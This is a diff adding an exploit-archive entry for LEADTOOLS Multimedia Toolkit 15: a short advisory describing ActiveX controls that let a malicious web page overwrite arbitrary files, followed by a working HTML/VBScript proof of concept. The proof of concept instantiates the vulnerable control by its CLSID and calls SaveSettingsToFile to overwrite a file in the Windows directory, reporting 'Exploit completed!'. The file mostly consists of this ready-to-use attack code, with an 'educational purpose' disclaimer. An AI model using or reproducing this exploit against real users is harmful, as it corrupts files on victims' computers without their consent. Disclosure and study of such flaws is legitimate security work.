@@ -1,0 +1,42 @@
+source: http://www.securityfocus.com/bid/28442/info
+
+LEADTOOLS Multimedia is prone to multiple vulnerabilities that allow attackers to overwrite arbitrary files. These issues affect multiple ActiveX controls.
+
+An attacker can exploit these issues by enticing an unsuspecting victim to view a malicious HTML page.
+
+Successfully exploiting these issues will allow the attacker to corrupt and overwrite arbitrary files on the victim's computer in the context of the vulnerable application using the ActiveX control (typically Internet Explorer).
+
+LEADTOOLS Multimedia 15 is vulnerable; other versions may also be affected.
+
+<pre>
+<code><span style="font: 10pt Courier New;"><span 
+class="general1-symbol"><body 
+bgcolor="#E0E0E0">--------------------------------------------------------------------
+ <b>LEADTOOLS Multimedia Toolkit 15 Arbitrary Files Overwrite</b>
+ url: http://www.leadtools.com
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+
+ <b><font color=&#039;red&#039;>This was written for educational purpose. Use it 
+at your own risk.
+ Author will be not responsible for any damage.</font></b>
+--------------------------------------------------------------------
+&lt;object classid=&#039;clsid:00150B1A-B1BA-11CE-ABC6-F5B2E79D9E3F&#039; 
+id=&#039;test&#039;&gt;&lt;/object&gt;
+
+&lt;input language=VBScript onclick=tryMe() type=button value=&#039;Click 
+here to start the test&#039;&gt;
+
+&lt;script language=&#039;vbscript&#039;&gt;
+
+ Sub tryMe
+  test.SaveSettingsToFile &quot;c:\windows\system_.ini&quot;, 1
+  MsgBox &quot;Exploit completed!&quot;
+ End Sub
+&lt;/script&gt;
+</span></span>
+</code></pre>
+
+
